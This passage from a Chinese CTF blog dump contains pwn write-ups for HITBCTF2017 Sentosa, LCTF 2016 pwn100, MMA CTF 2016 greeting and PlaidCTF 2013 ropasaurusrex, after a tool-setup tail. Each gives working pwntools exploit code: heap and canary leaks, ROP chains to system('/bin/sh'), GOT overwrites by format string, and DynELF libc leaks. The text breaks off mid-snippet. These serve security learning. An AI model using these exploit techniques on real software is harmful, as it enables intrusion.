setuptools-36.6.0\npython2 setup.py install\n```\n\n5.安装pip四部曲：\n\n```\n#注释头\n\nwget https://pypi.python.org/packages/11/b6/abcb525026a4be042b486df43905d6893fb04f05aac21c32c638e939e447/pip-9.0.1.tar.gz#md5=35f01da33009719497f01a4ba69d63c9\ntar -zxvf pip-9.0.1.tar.gz\ncd pip-9.0.1\npython2 setup.py install\nln -s /usr/local/python27/bin/pip2.7 /usr/bin/pip2\n```\n\n6.安装pwndbg三部曲:\n\n```\n#注释头\n\ngit clone https://github.com/pwndbg/pwndbg\ncd pwndbg\n./setup.sh\n```\n\n7.添加pwngdb:\n\n```\n#注释头\n\ncd ~\ngit clone https://github.com/0xKira/pwngdb.git\nvim ~/.gdbinit\n#将peda注释，添加：(必须加在第一行)\nsource ~/pwndbg/gdbinit.py\n```\n\n8.安装pwntools一步曲：\n\n```\n#注释头\n\npip2 install pwntools\npip3 install pwntools\n```\n\n三、准备源码：\n\n```\n#注释头\n\nhttp://ftp.gnu.org/gnu/glibc/\n```\n\n挂飞机下gz包老快了，找到里面的malloc.c准备开始阅读。\n\n四、跟着CTFwiki一步步调试：\n\nhttps://wiki.x10sec.org/pwn/linux/glibc-heap/chunk_extend_overlapping-zh/\n\n五、视频调试：\n\nhttps://www.bilibili.com/video/BV1q5411h7Wf\n\n \n\n \n\n \n\n \n\n \n","tags":["pwn-Knowledge"],"categories":["PWN"]},{"title":"HCTF2018_the_end","url":"/2021/08/14/HITBCTF2017 Sentosa/","content":"\n1.常规checksec，保护全开。IDA打开找漏洞，在sub_BF0()函数，即读入name的函数中存在栈溢出漏洞：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191514947.jpeg)\n\n利用结构体重整化\n\n```\n#注释头\n\nstruct project{\nint length;\nchar name[length];\nint check;\nint price;\nint area;\nint capactity;\n}project;\n\nstruct project* projects[0x10];\n```\n\n由于length是由用户输入影响的，那么结构体的大小也是不固定的，所以提出来固定的形成project_behind结构体方便查看：\n\n```\n#注释头\n\nstruct project_behind{\nint check;\nint price;\nint area;\nint capactity;\n}project_behind;\n```\n\n得到如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191514952.jpeg)\n\n其实际意义就是读入length-1个字节，然后将最后一个字节设置为\\x00。但是这里没有检查data_length，即如果传入的length为0，那么data_length由于是int类型，而i也是int类型，那么i从0开始加需要加0xfffff.....这么多才会抵达-1，相当于可以读入任意长度的字符串，造成栈溢出。\n\n2.栈溢出，保护全开，canary把着栈溢出的口子，所以得先想办法泄露canary。\n\n(1)题目虽然打印了name，但是打印的是堆上的name，没办法利用name连上canary来泄露。\n\n(2)足够长的栈溢出，但是没有这个进程是fork创建，而不是进程pthread创建，所以没办法溢出足够长来覆盖TSL中的canary。\n\n那么既然能控制栈，就从栈上入手，寻找add函数栈上的有用数据：\n\n```\n#注释头\n\nchar *project; // [rsp+6Ah] [rbp-3Eh]\n-------------------------------------------------------------------\nproject = malloc(length + 21LL);\n--------------------------------------------------------------------\nprojects[idx] = project;\n```\n\n可以看到对IDA重整化之后的内容中，project变量位于栈上，里面保存着project这个chunk的首地址，最后会被放入projects这个数组中。所以如果我们修改掉project变量的内容，将其指向其它的地址，那就实现任意地址可写了。\n\n3.但是这里保护全开，一个有用地址都没有。可以注意到project变量最后会保存一个堆地址，由于大端序，如果我们将这个堆地址的最后一个字节变成\\x00，那么这个chunk就会指向第一个chunk，也就是project[0]，如果第一个chunk处于释放状态，就可以通过程序的view函数来将这个chunk的fd指针打印出来。\n\n4.由于使用溢出的前提条件是length为0，所以malloc(21)对应chunk大小为0x20，释放后会进入fastbins中，fastbins中chunk的fd保存下一个chunk的头地址。那么就可以打印出fd上的内容，泄露出堆地址。\n\n5.现在可以控制堆内容了，那么通过正常手段申请几个chunk，在里面构造一个fakechunk，之后利用溢出漏洞控制这个fakechunk，将其释放掉，使其进入unsortedbin中。再利用溢出漏洞控制这个被释放的fakechunk，打印出其fd指针，就是main_aren+88的地址，从而泄露Libc地址。\n\n6.现在有了libc地址和栈溢出，需要突破canary，突破口是environ这个变量。environ这个变量从程序加载时保存在libc数据段上，但是它的内容保存的是栈地址，所以我们就可以通过溢出漏洞打印出environ中的栈地址。得到栈地址之后就可以用gdb计算偏移，选取view函数栈上的canary，再利用溢出漏洞打印出canary的值。\n\n7.之后有了libc,canary,栈溢出,就是常规的getshell了。\n\n8.编写exp:\n\n(1)前置增删改查：\n\n```\n#注释头\n\ndef start_proj(length, name, price, area, capacity):\n    io.sendlineafter(\"Exit\\n\", '1')\n    io.sendlineafter(\"name: \", str(length))\n    io.sendlineafter(\"name: \", name)\n    io.sendlineafter(\"price: \", str(price))\n    io.sendlineafter(\"area: \", str(area))\n    io.sendlineafter(\"capacity: \", str(capacity))\n\ndef view_proj():\n    io.sendlineafter(\"Exit\\n\", '2')\n\ndef cancel_proj(idx):\n    io.sendlineafter(\"Exit\\n\", '4')\n    io.sendlineafter(\"number: \", str(idx))\n```\n\n(2)泄露堆地址：\n\n```\n#注释头 \n\ndef leak_heap():\n    global heap_base\n\n    start_proj(0, 'A', 1, 1, 1)        #chunk0\n    start_proj(0, 'A'*0x5a, 1, 1, 1)   #chunk1\n    #溢出一个字节，修改栈上project的最后一个字节为\\x00,使其指向chunk0\n    start_proj(0, 'A', 1, 1, 1)        #chunk2\n    cancel_proj(2)\n    cancel_proj(0)\n\n    view_proj()\n    #打印chunk1就相当于打印chunk0的内容，其中包含fd指针部分内容\n\n    io.recvuntil(\"Capacity: \")\n    leak = int(io.recvline()[:-1], 10) & 0xffffffff\n    heap_base = (0x55<<40) + (leak<<8) # 0x55 or 0x56\n    #由于程序的关系，只能打印出0x55之后的内容，共4个字节，由于堆地址高位一般都是0x55或0x56，所以直接加上即可，最后还得乘上0x100，因为没有泄露出来，需要调试看看。\n\n    log.info(\"heap base: 0x%x\" % heap_base)\n```\n\n(3)泄露libc地址：\n\n```\n#注释头 \n\ndef leak_libc():\n    global libc_base\n\n    start_proj(0xf, 'A', 0xd1, 0, 0x64)                       #chunk0\n    #chunk0用来修改fakechunk的size位为0xd1,占位0x30,位于heap_base+0x60\n\n    start_proj(0x50, '\\x01', 1, 1, 1)                         #chunk2\n    #chunk2占位0x70用,位于heap_base+0x90,'\\x01'不知道干啥的，'\\x00'随便啥都可以\n\n    start_proj(0x50, 'A'*0x44+'\\x21', 1, 1, 1)                #chunk3\n    #chunk3用来修改fakechunk的size位，占位0x70,位于heap_base+0x100\n\n    start_proj(0, 'A'*0x5a + p64(heap_base+0x90), 1, 1, 1)    #chunk4\n    #chunk4修改chunk4指向heap_base+0x90，占位0x20,位于heap_base\n\n    start_proj(0, 'A'*0x5a + p64(heap_base+0x8b), 1, 1, 1)    #chunk5\n    #chunk5占位0x20,修改chunk5指向heap_base+0x8b,位于heap_base+0x40\n\n    #将fakechunk放入unsortedbin中\n    cancel_proj(4)\n    \n    #获得libc地址\n    view_proj()\n\n    #由于一次只能泄露4个字节，所以需要两部分拼接\n    for i in range(5):\n        io.recvuntil(\"Area: \")\n    leak_low = int(io.recvline()[:-1], 10) & 0xffffffff\n    io.recvuntil(\"Capacity: \")\n    leak_high = int(io.recvline()[:-1], 10) & 0xffff\n    libc_base = leak_low + (leak_high<<32) - 0x3c3b78\n\n    log.info(\"libc base: 0x%x\" % libc_base)\n```\n\n①chunk0中的0x64用来过程序中删除project函数的检查：\n\nif ( *(project + *project + 5) != 1 )\n\n只要计算之后check为1即可，实测0x60也可以。\n\n②chunk3中的\\x21为了过glibc中的检查。\n\n③chunk5为了填满之前的索引为2的project，方便之后运作。\n\n(4)泄露canary:\n\n```\n#注释头 \n\ndef leak_stack_canary():\n    global canary\n\n    environ_addr = libc.symbols['__environ'] + libc_base\n    log.info(\"__environ address: 0x%x\" % environ_addr)\n\n    start_proj(0, 'A'*0x5a + p64(environ_addr - 9) , 1, 1, 1) # 4\n\n    view_proj()\n    for i in range(5):\n        io.recvuntil(\"Price: \")\n    leak_low = int(io.recvline()[:-1], 10) & 0xffffffff\n    io.recvuntil(\"Area: \")\n    leak_high = int(io.recvline()[:-1], 10) & 0xffff\n    stack_addr = leak_low + (leak_high<<32)\n    canary_addr = stack_addr - 0x130\n\n    log.info(\"stack address: 0x%x\" % stack_addr)\n    log.info(\"canary address: 0x%x\" % canary_addr)\n\n    start_proj(0, 'A'*0x5a + p64(canary_addr - 3), 1, 1, 1) # 6\n\n    view_proj()\n    for i in range(7):\n        io.recvuntil(\"Project: \")\n    canary = (u64(io.recvline()[:-1] + \"\\x00\"))<<8\n\n    log.info(\"canary: 0x%x\" % canary)\n```\n\n(5)栈溢出覆盖返回地址为system，pop rdi传参getshell\n\n```\n#注释头 \n\npop_rdi_ret = libc_base + 0x21102\nbin_sh = libc_base + next(libc.search('/bin/sh\\x00'))\nsystem_addr = libc_base + libc.symbols['system']\n\npayload = \"A\" * 0x68\npayload += p64(canary) # canary\npayload += \"A\" * 0x28\npayload += p64(pop_rdi_ret) # return address\npayload += p64(bin_sh)\npayload += p64(system_addr) # system(\"/bin/sh\")\n\nstart_proj(0, payload, 1, 1, 1)\n\nio.interactive()\n```\n\n \n\n▲这道题需要很多调试的地方，容易头大崩溃。\n\n参考资料：\n\nctf-all-in-one\n\n \n\n \n\n \n\n \n\n \n\n \n\n \n","tags":["Heap-Skill"],"categories":["PWN","pwn堆-刷题技巧"]},{"title":"LCTF 2016-pwn100","url":"/2021/08/14/LCTF 2016-pwn100/","content":"\n \n\n1.常规checksec，开了NX保护。打开IDA，找漏洞，逐次进入后，sub_40068E()函数中的sub_40063D函数中存在栈溢出：\n\n```\n#注释头\n\n\nchar v1; // [rsp+0h] [rbp-40h]\n---------------------------------------------\nsub_40063D((__int64)&v1, 200);\n--------------------------------------------------------------------\nfor ( i = 0; ; ++i )\n{\n    result = i;\n    if ( (signed int)i >= a2 )\n      break;\n    read(0, (void *)((signed int)i + a1), 1uLL);\n}\n```\n\n这里传的是局部变量v1的地址，所以进入sub_40063D后，修改a1指针对应的内存的值其实就是修改之前局部变量v1的值，就是传指针。这个函数每次读取一个字节，直到读取满200字节，其实就可以直接把它当成read(v1,200)完事。\n\n(题外话：汇编代码中当局部变量传参时，需要用到lea，即：lea   rax, [rbp+var_40]，就是将栈上的变量var_40的地址给rax，然后传参mov   rdi, rax；利用rdi来传函数参数。进入到函数内部后就会有：mov   [rbp+var_18], rdi，也就是在该函数栈上创建一个局部变量来保存传入变量的栈上的地址，也就是之前var_40的栈上地址，保存在[rbp+var_18]这个局部变量中。这是这个程序中，不同程序可能不太一样。)\n\n2.所以这个栈溢出的覆盖返回地址应该是sub_40068E函数的返回地址，简单远程调试一下，看看v1所在栈地址和rbp下一地址的距离就是偏移量，为0x48，看汇编计算就可以得到0x40+0x8。\n\n3.现在需要system和binsh，这个程序中这两个都没有带，而只有Libc中才有，但是这个程序并没有泄露Libc的地址。分析程序发现，程序中.plt段中导入了puts函数，IDA中函数名那一块可以看到：所以可以用pwntools中的DynELF，调用该puts函数，从而泄露出libc中puts或者read的地址。由于大多教程选择泄露read，所以这里选择泄露puts函数在Libc中的被加载的地址。这里用read,setbuf,甚至__libc_start_main函数也都可以，因为都导入了plt表和外部引用了。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552597.png)\n\n4.开始构造泄露地址的第一段payload:\n\n```\n#注释头\n\npayload = \"A\"*72            #padding\npayload += p64(pop_rdi)      \n#由于需要向puts传参，所以用到该地址，可以使用ropgadget\n#查询ROPgadget --binary pwn100 | grep \"pop rdi ; ret\"\n#或者在万能gadget中的pop r15，用D命令转换成数据后再C命令转换回代码可以看到\npayload += p64(puts_got)\n#这是puts在.got表(.got.plt段)中的地址，是传递给Puts函数的参数，当该库函数被加载进入libc中\n#时，这样传参进去再打印就可以打印出puts函数在libc中的地址，也就泄露出来了。\npayload += p64(puts_addr)\n#这是调用puts函数，elf.plt['puts']（.plt段）\npayload += p64(start_addr)\n#整个程序的起始代码段，用以恢复栈。这个函数中会调用main函数。这里用Mian函数地#址也可以\npayload = payload.ljust(200, b\"B\")\n#使用B填充200字节中除去先前payload剩余的空间，填充的原因是因为这个程序需要我们输入满200字节\n#才会跳出循环，进而才有覆盖返回地址的可能。或者可以写成：\n#(payload += 'a'*(200-0x48-32))\n```\n\n5.之后开始运行payload来实际得到Puts函数被libc加载的实际内存地址：\n\n```\n#注释头\n\nio.send(payload)\nio.recvuntil('bye~\\n')#跳出循环后才会执行到打印bye的地方\nputs_addr = u64(io.recv()[:-1].ljust(8, b'\\x00'))\n#这里就是接收泄露地址的地方，末尾需要填充上\\x00\nlog.info(\"puts_addr = %#x\", puts_addr)\nsystem_addr = puts_addr - 0xb31e0\nlog.info(\"system_addr = %#x\", system_addr)\n```\n\n6.现在得到了puts函数被libc加载的实际内存地址，那么puts函数与其它函数的偏移量也就可以通过用IDA打开题目给的libc查出来，从而得到其它我们需要的函数被libc加载的实际内存地址。\n\n```\n#注释头\n\n00000000000456A0  ---system_in_libc\n00000000000F8880 ---read_in_libc\n0000000000070920  ---puts_in_libc\n000000000018AC40 ---binsh_in_libc\n```\n\n得到libc被加载的首地址：puts_addr 减去 puts_in_libc 等于libc_start。于是libc_start加上各自函数对应的in_libc也就可以得到被libc加载的实际内存地址。\n\n7.现在都有了就可以尝试在执行一次栈溢出来开shell，64位程序，有了system函数和binsh地址，那么栈溢出覆盖用pop rdi;ret的方法可以直接getshell。\n\n8.这里假设没有binsh，来使用一下万能gadget：通过我们的输入读到内存中。同样这张图，万能Gadget1为loc_400616，万能Gadget2为loc_400600\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552166.png)\n\n以下为用来读取binsh字符串的代码，这里需要在程序中找到一段可以写入之后不会被程序自动修改的内存，也就是binsh_addr=0x60107c，这个地址其实是extern的地址，里面原来保存的内容是read函数发生延迟绑定之前的地址。而延迟绑定发生之后，got表中保存的内容已经被改成了被Libc加载的真实地址，这个extern也就没用了，可以随意用。但如果某个函数没有被首次调用，即还没发生延迟绑定，而我们却先一步改掉了extern的内容，那么它就再也没办法被调用了。\n\n```\n#注释头\n\n\nbinsh_addr = 0x60107c\t\t\t\n#bss放了STDIN和STDOUT的FILE结构体，修改会导致程序崩溃\n\npayload = b\"A\"*72\npayload += p64(universal_gadget1) #万能gadget1\npayload += p64(0) #rbx = 0\npayload += p64(1)\n#rbp = 1，过掉后面万能gadget2的call返回后的判断,使它步进行跳转，而是顺序执行到万\n#能gadget1，从而return到最开始来再执行栈溢出从而Getshell。\n#cmp 算术减法运算结果为零,就把ZF(零标志)置1,cmp a b即进行运算a-b\npayload += p64(read_got)\n#r12 = got表中read函数项，里面是read函数的真正地址，直接通过call调用\npayload += p64(8) #r13 = 8，read函数读取的字节数，万能gadget2赋值给rdx\npayload += p64(binsh_addr) #r14 = read函数读取/bin/sh保存的地址，万能gadget2赋值给rsi\npayload += p64(0)\n#r15 = 0，read函数的参数fd，即STDIN，万能gadget2赋值给edi\npayload += p64(universal_gadget2) #万能gadget2\npayload += b'\\x00'*56\n#万能gadget2后接判断语句，过掉之后是万能gadget1，而Loc_400616万能gadget1执行之\n#后会使得栈空间减少7*8个字节，所以我们需要提前输入7*8来使得万能gadget1执行之\n#后栈的位置不发生变化，从而能正常ret之后接上的start_addr\n#用于填充栈，这里用A也是一样\npayload += p64(start_addr) #跳转到start，恢复栈\npayload = payload.ljust(200, b\"B\") #padding\n#不知道这有什么用，去掉一样可以getshell，因为这边是直接调用read函数，而不是经过\n#sub_40068E()非得注满200字节才能跳出循环。\n\nio.send(payload)\nio.send(b\"/bin/sh\\x00\")\n#上面的一段payload调用了read函数读取\"/bin/sh\\x00\"，这里发送字符串\n#之后回到程序起始位置start\n```\n\n这里万能Gadget中给r12赋值，传入的一定是该函数的got表，因为这里的call和常规的call有点不太一样。我们在IDA调试时按下D转换成硬编码形式，(这里可以在IDA中选项-常规-反汇编-操作码字节数设置为8)可以看到这个call的硬编码是FF，而常规的call硬编码是E8。(这里call硬编码之后的字节代表的是合并程序段之前的偏移量，具体可以参考静态编译、动态编译、链接方面的知识)在这个指令集下面：\n\nFF的call后面跟的是地址的地址。例如call [func], 跳转的地方就应该是func这个地址里保存的内容，也就是*func。\n\nE8的call后面跟的是地址。例如call func，跳转的地方就是func的开头。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552928.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552607.jpeg)\n\n这里可以不用非得看硬编码，可以直接看汇编也可以显示出来：一个有[],一个没有[]。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552863.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552842.jpeg)\n\n9.所以万能gadget中通过r12，传入跳转函数的地址只能是发生延迟绑定之后的got表地址，而不能是plt表地址或者是没有发生延迟绑定的got表地址，(延迟绑定只能通过plt表来操作，没有发生延迟绑定之前，该got表中的内容是等同于无效的，只是一个extern段的偏移地址，除非该函数func是静态编译进程序里面的，那么got表中的内容就是该函数的真实有效地址，不会发生延迟绑定。)因为plt表中的内容转换成硬编码压根就不是一个有效地址，更别说跳转到该地址保存的内容的地方了。有人说跳转到plt表执行的就是跳转got表，那应该是一样的啊，但FF的call并不是跳转到plt来执行里面的代码，而是取plt表中内容当作一个地址再跳转到该地址来执行代码，所以有时候需要看汇编代码来决定究竟是传入got表还是传入plt表。同样也可以看到plt表中的硬编码是FF，也就是并不是跳转got表，而是取got表中保存的内容当作一个地址再来跳转。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552806.jpeg)\n\n▲说了这么多，记住一个就行了，\n\n需要跳转函数时，有[]的-只能传got表，没[]的-传plt表(plt表更安全好使，但后面格式化字符串劫持got表又有点不太一样，情况比较复杂)。\n\n需要打印真实函数地址时，传的一定是got表，这样就一定没错。\n\n当有call eax;这类语句时，eax中保存的一定得是一个有效地址，因为这里的call硬编码也是0FF。(实际情况got和plt来回调着用呗，哪个好使用哪个)\n\n10.那么现在有了system_addr和binsh_addr，而程序又是从最开始运行，所以现在尝试getshell：\n\n```\n#注释头\n\npayload = b\"A\"*72 #padding\npayload += p64(pop_rdi) #给system函数传参\npayload += p64(binsh_addr) #rdi = &(\"/bin/sh\\x00\")\npayload += p64(system_addr) #调用system函数执行system(\"/bin/sh\")\npayload = payload.ljust(200, b\"B\") #padding，跳出循环\nio.send(payload)\nio.interactive()\n```\n\n11.另外由于在libc中查找也比较繁琐，所以有个libcSearch可以简化使用，具体查资料吧。\n\n \n\n▲\n\n1.往puts函数中传入函数在got表中的地址（elf.got）参数可以打印出被加载在Libc中的实际内存地址。\n\n2.用覆盖返回地址ret的形式调用函数需要用函数在plt表中的地址，（elf.plt）这是库函数地址，需要先到plt中，然后再到got表中，这是正常的函数调用。\n\n3.但如果在gadget中，则可以通过给r12赋值来调用elf.got表中的函数，因为这个是call qword ptr[r12+rbx*8]，指向的是函数在got表中真实地址，需要的是函数在got表中的地址。如果只是call addr，则应该是call函数在plt表中的地址。\n\n4.万能gadget一般在_libc_csu_init中，或者init或者直接ROPgadget查也可以\n\n \n\n▲mov和lea区别：\n\nmov:对于变量，加不加[]都表示取值；对于寄存器而言，无[]表示取值，有[]表示取地址。\n\nlea:对于变量，其后面的有无[]皆可，都表示取变量地址，相当于指针。对于寄存器而言，无[]表示取地址，有[]表示取值。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"MMA CTF 2nd 2016-greeting","url":"/2021/08/14/MMA CTF 2nd 2016-greeting/","content":"\n1.常规checksec，开了canary和NX。IDA打开找漏洞，main函数中格式化字符串漏洞：\n\n```\n#注释头\n\n\nchar v5; // [esp+5Ch] [ebp-44h]\nchar s; // [esp+1Ch] [ebp-84h]\n-----------------------------------------------------\nif ( !getnline(&v5, 64) )\nsprintf(&s, \"Nice to meet you, %s :)\\n\", &v5);\nreturn printf(&s);\n```\n\n2.再找system，有导入，没有binsh，没有Libc。用格式化字符串修改某个函数的got表指向system函数，然后再次运行程序得以输入binsh传给该函数，相当于调用system函数，之后就可以getshell。但是发现该程序中没有循环，修改之后没办法再次输入。\n\n3.这里需要用到c语言的结构执行：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191541317.png)\n\nc语言编译后，执行顺序如图所示，总的来说就是在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针。\n\n4.利用Main函数结束时会调用fini段的函数组这一个特点，我们尝试找到fini函数组的地址，利用格式化字符串漏洞来修改该地址，修改.fini_array数组的第一个元素为start，使得Main函数退出时运行该地址可以重复回到start来再次执行一次输入。\n\n5.fini_array段的地址直接ctrl+s就可以找到，内容是__do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux，保存的内容是一个地址，该地址对应是一个代码段，该代码段的函数名为__do_global_dtors_aux proc near。其它函数对应的got,plt可以通过elf.pot\\\\elf.plt对应的来搜索。\n\n6.但是这里存在一个问题，要将什么地址劫持为system函数？这个地址必须是在getline最后或者是之后，而且还需要有参数来执行binsh。第一个想到的是sprintf，因为该函数在getline函数之后，并且从右往左数第一个参数就是我们保存的内容，但是尝试过后发现崩溃了，修改是能修改，但是传参的时候有点问题。后面查看该函数汇编代码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191541342.jpeg)\n\n可以看到查看该函数从栈上取的第一个参数应该是s这个数组，而不是我们穿的v5，而如果劫持为system函数，那么就要求栈上的esp指向的内容的地址是binsh字符串，但是这里确实指向s这个数组中的内容，为空，那么system函数就没办法调用成功了。后面又看printf函数，还是不行，因为这里printf函数的参数也是s这个数组，内容此时为空，无法顺利调用。之后再找，经过getnline函数内部可以发现有个strlen函数：\n\n```\n#注释头\n\n#代码中的形式：\nif ( !getnline(&v5, 64) )\n----------------------------------------------------------------\ngetnline(char *s, int n)\nreturn strlen(s);\n\n#该函数原型：\nunsigned int strlen(const char *str);\n-------------------------------------------------------\n#system函数原型：\nint system(const char *command); \n```\n\nsystem函数调用规则是需要一个地址，地址上保存的内容是binsh字符串，或者直接\"binsh\"字符串赋予，C语言中就代表在全局变量中开辟一块内存，然后该内存保存的是binsh字符串，然后将该内存的地址赋予给system函数当作参数运行。总之就是system函数需要的参数是一个地址。\n\n这里的strlen满足这个条件，虽然上面写的只是s，但是s中保存的内容是一个地址，输入AAAA，通过调试查看内容：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191540223.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191540170.jpeg)\n\n同样的，查看下汇编代码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191540150.jpeg)\n\n可以看到[esp+s]相当于是取s的栈地址赋值给eax，然后eax赋值给esp栈顶，这两行破代码有病，一毛一样。所以现在跳转进strlen中的话，esp的值也就是参数，是一个栈上地址，内容就是AAAA。也就相当于在strlen中的s的值是一个地址，那么劫持后，就相当于system(s)，同样可以getshell。\n\n▲劫持为system函数，要求原函数的参数也应该是一个地址才行，不然无法跳转。\n\n7.确定攻击思路后，开始计算偏移，先用IDA简单远程调试，输入AAAA，然后将程序一直运行至printf处，可以看到栈中的偏移为12.5处会出现A的ascii值，也就是41。由于我们需要栈中完整的对应地址，所以需要输入aa填充两个字节，来使得偏移量从12.5到13处，从而能够完整地输入我们需要修改的地址。\n\n8.之后编写payload，这里使用控制字符%hn(一次改动两个字节)来修改：\n\npayload = ‘aa’+p32(fini_array_addr+2) + p32(fini_array_addr) + p32(strlen_got+2) + p32(strlen_got) + str(格式化fini+2) + str(格式化fini) + str(格式化strlen_got+2) + str(格式化strlen_got)\n\n9.之后还得确定输出的值：\n\n```\n#注释头\n\nfini_array = 0x08049934\nstart_addr = 0x080484f0\nstrlen_got = 0x08049a54\nsystem_plt = 0x08048490\n```\n\n查看代码，由于sprintf的作用，printf的参数s保存的不止有我们输入的，还有Nice to meet you,计算加上aa可得总共有8f-7c+1=0x14个，再加上三个32位的地址12字节，总共32字节，也就是0x20。(计算截至为 str(格式化fini+2)处)\n\n10.另外由于.fini_array的内容为0x080485a0(按d可查看数据)，而我们需要更改的start地址为0x080484f0，所以只需要改动大端序列中的85a0变成84f0即可。所以格式化.fini中需要再输出的字节数应该是0x84f0-0x20=0x84D0=34000。而0x08049934+2处的内容本身就是0804，不需要修改。所以只需要修改.fini_array_addr对应的内容即可，(.fini_array+2对应的内容本身就是0804，不用修改)。所以payload可以删去p32(fini_array_addr+2)和str(格式化fini+2)。\n\n11.接着计算，需要将strlen_got+2处的值改成0804，由于之前已经输出了0x84f0所以需要用到数据截断。也就是格式化内容中需要再输出的字节数为0x10804-0x84f0=0x8314=33556。\n\n然后再计算strlen_got的值，需要再输出0x18490-0x10804=0x7c8c=31884。\n\n故都计算完毕，最后payload为：\n\npayload = ‘aa’ + p32(fini_array_addr) + p32(strlen_got+2) + p32(strlen_got) + ’%34000c%12$hn’ + ‘%33556c%13$hn’ + ‘%31884c%14$hn’\n\n12.payload之后，运行完第一次的printf之后，程序会回到start，之后需要再输入字符串io.sendline('/bin/sh\\x00')来完整运行system，从而getshell。\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"PlaidCTF 2013 ropasaurusrex","url":"/2021/08/14/PlaidCTF 2013 ropasaurusrex/","content":"\n1.常规checksec，只开启了一个NX，不能使用shellcode，IDA分析漏洞，程序的sub_80483F4()函数栈溢出：\n\n```\n#注释头\n\nchar buf; // [esp+10h] [ebp-88h]\n------------------------------------------------------\nreturn read(0, &buf, 0x100u);\n```\n\n有write函数，没有libc，got表里没有system，也没有int 80h/syscall，没有binsh字符串。\n\n2.这种情况下我们就可以使用DynELF来leaklibc，进而获取system函数在内存中的地址，然后就可以再用read函数来读取字符串。\n\n3.首先编写leak函数，也就是需要调用write函数打印需要泄露的地址\n\n常规的leak函数模式：\n\n```\n#注释头\n\ndef leak(addr):\n    payload = ''\n    payload += 'A'*n #padding\n    payload += p32(write_addr) #调用write\n    payload += p32(start_addr) #write返回到start\n    payload += p32(1) #write第一个参数fd\n    payload += p32(addr) #write第二个参数buf\n    payload += p32(8) #write第三个参数size\n    io.sendline(payload)\n    content = io.recv()[:8] #接受内容读取通过write打印的地址\n    print(\"%#x -> %s\" %(addr, (content or '').encode('hex')))\n    #这里打印不需要也可以，只是可以打印出来让我们看到write打印了什么地址，基本都打印了\n    return content\n    #这里return的conten有很多地址，需要通过之后的DynELF来lookup对应的地址\n```\n\n这里的write函数可以换成put或者printf函数，但是如果改变了，那么后面的参数个数也需要发生改变，对应打印函数的形式：\n\n```\n#注释头\n\nssize_t write(int fd,const void *buf,size_t count);\nint puts(const char *s)\nint printf(const char*format, ......)；\n```\n\n具体请参考：\n\nhttps://www.anquanke.com/post/id/85129\n\n4.接下来就需要创建DynELF类来使用\n\n```\n#注释头\n\nd = DynELF(leak, elf = elf)\n#创建DynELF类，传入需要泄露的地址，从elf文件中获取\nsystem_addr = d.lookup('system', 'libc')\n```\n\n5.找到system_addr之后，就可以通过再次利用栈溢出来读取字符串，因为之前write的返回地址已经是最开始的start地址。再次运行到read函数读取第二次的payload，组成为：\n\n```\n#注释\n\npayload = padding\npayload += read_addr #覆盖eip，将sub_80483F4函数的返回地址劫持到read函数)\npayload += system_addr #使得read函数的返回地址为system)\npayload += p32(fd) #read函数的第一个参数，同时也对应system函数的返回地址\npayload += p32(binsh_addr) #read函数读取进binsh的地址，同时也对应system函数的参数\npayload += p32(size) #read函数的第三个参数，读取的字符串大小，于system函数无实际意义，但是如果system函数返回了，那么这就是返回之后的eip，下一条执行的代码地址。\n```\n\n6.程序总流程如下：\n\n由于第一段Payload最后write调用后返回到了start，所以又调用sub_80483F4函数，进入读取界面，需要输入第二段payload栈溢出，劫持sub_80483F4函数的返回地址eip为read函数地址，从而进入read函数。之后再次劫持read函数的返回地址为system函数，并且将read的第二个参数，也就是读取进的binsh字符串也传入system函数，从而getshell。\n\n \n\n \n\n▲call _read函数和直接调用read_plt的区别：\n\n1.call _read函数会push eip，会使得栈中结构从我们原本设置好的：\n\n```\n#注释头\n\npadding\n(call read_addr)_addr\nsystem_addr\nfd\nbinsh_addr\nsize\n```\n\n变成:\n\n```\n#注释头\n\npadding\n(call read_addr)_addr\n(call read_addr)_addr下一条指令\nsystem_addr\nfd\nbinsh_addr\nsize\n```\n\n这个eip没办法改变，因为是call这个指令带来的，这样就会导致在read函数没办法正常读取参数，如果去掉system_addr，又会导致返回到call指令下一条leave要执行时，ebp会指向一个padding，这是在read函数中变成的，从而导致leave指令也出错。\n\n2.但是如果直接调用read_plt，栈中结构为：\n\n```\n#注释头\n\npadding\nread_plt_addr\nsystem_addr\nfd\nbinsh_addr\nsize\n```\n\n这样Read函数读取完之后，返回时就会直接调用system_addr，完全不用管ebp变成了什么，同时这里也可以直接将binsh_addr传给system，一举两得。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Dynelf"],"categories":["PWN","Dynelf0x5"]},{"title":"Openctf 2016-tyro_shellcode1","url":"/2021/08/14/Openctf 2016-tyro_shellcode1/","content":"\n \n\n1.常规checksec，开了Canary和NX，IDA查找漏洞，找到下列奇怪代码：\n\n```\n#注释头\n\nv4 = mmap(0, 0x80u, 7, 34, -1, 0);\n-----------------------------------------------------------------------------\nread(0, v4, 0x20u);\nv5 = 